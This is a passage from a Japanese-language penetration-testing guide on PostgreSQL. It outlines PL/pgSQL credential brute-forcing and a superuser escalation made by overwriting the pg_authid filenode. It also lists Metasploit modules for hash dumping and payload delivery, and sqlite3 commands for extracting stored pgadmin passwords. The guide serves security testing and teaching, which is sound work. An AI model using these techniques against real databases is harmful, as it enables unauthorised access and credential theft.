**この言語を悪用して、PostgreSQLにユーザーの資格情報をブルートフォースさせることができます。**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md" %}
[pl-pgsql-password-bruteforce.md](../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md)
{% endcontent-ref %}

### 内部のPostgreSQLテーブルを上書きして権限昇格

{% hint style="info" %}
次の権限昇格ベクトルは、制約されたSQLiコンテキストで特に有用であり、すべての手順をネストされたSELECTステートメントを介して実行できます
{% endhint %}

PostgreSQLサーバーファイルを**読み書き**できる場合、内部の`pg_authid`テーブルに関連付けられたPostgreSQLのディスク上のファイルノードを上書きすることで、**スーパーユーザー**になることができます。

**この手法**について詳しくは[**こちら**](https://adeadfed.com/posts/updating-postgresql-data-without-update/)**をご覧ください。**

攻撃手順は以下の通りです：

1. PostgreSQLデータディレクトリを取得する
2. `pg_authid`テーブルに関連付けられたファイルノードへの相対パスを取得する
3. `lo_*`関数を介してファイルノードをダウンロードする
4. `pg_authid`テーブルに関連付けられたデータ型を取得する
5. [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor)を使用して、`pg_authid`テーブルの[ファイルノードを編集](https://adeadfed.com/posts/updating-postgresql-data-without-update/#privesc-updating-pg\_authid-table)し、すべての`rol*`ブールフラグを1に設定して完全な権限を付与する
6. `lo_*`関数を介して編集済みのファイルノードを再アップロードし、ディスク上の元のファイルを上書きする
7. （オプション）高コストなSQLクエリを実行してインメモリテーブルキャッシュをクリアする
8. これで完全なスーパーアドミンの権限を持つようになります。

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### ロギング

_**postgresql.conf**_ ファイルの中で、以下を変更して、PostgreSQL ログを有効にできます：
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
その後、**サービスを再起動**してください。

### pgadmin

[pgadmin](https://www.pgadmin.org)は、PostgreSQLの管理および開発プラットフォームです。\
_**pgadmin4.db**_ファイルの中に**パスワード**が見つかります。\
スクリプト内の_decrypt_関数を使用してそれらを復号化できます：[https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg\_hba

PostgreSQLのクライアント認証は、**pg\_hba.conf**という構成ファイルを介して管理されます。このファイルには、接続タイプ、クライアントIPアドレス範囲（該当する場合）、データベース名、ユーザー名、および一致する接続に使用する認証方法を指定するレコードのシリーズが含まれています。接続タイプ、クライアントアドレス、要求されたデータベース、およびユーザー名に一致する最初のレコードが認証に使用されます。認証が失敗した場合、フォールバックやバックアップはありません。一致するレコードがない場合、アクセスは拒否されます。

pg\_hba.confで利用可能なパスワードベースの認証方法は**md5**、**crypt**、および**password**です。これらの方法は、パスワードの送信方法で異なります：MD5ハッシュ化、crypt暗号化、またはクリアテキスト。重要な点として、cryptメソッドは、pg\_authidで暗号化されたパスワードとは使用できません。
